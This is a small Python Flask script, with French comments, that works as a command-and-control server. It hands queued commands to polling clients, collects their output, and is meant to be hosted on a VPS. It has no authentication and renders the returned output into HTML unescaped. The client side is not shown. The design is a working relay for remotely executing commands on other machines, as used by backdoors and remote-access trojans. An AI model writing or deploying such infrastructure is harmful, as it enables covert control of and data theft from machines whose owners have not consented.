from flask import Flask, request

app = Flask(__name__)

command_to_execute = "none"
result_output = ""


@app.route("/command", methods=["GET"])
def get_command():
    return command_to_execute  # Envoie la commande au client


@app.route("/command", methods=["POST"])
def set_command():
    global command_to_execute
    command_to_execute = request.form["command"]
    return "Commande mise à jour"


@app.route("/result", methods=["POST"])
def get_result():
    global result_output
    result_output = request.form["output"]
    return "Résultat reçu"


@app.route("/view_result", methods=["GET"])
def view_result():
    return f"<pre>{result_output}</pre>"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)  # Héberge le serveur sur ton VPS
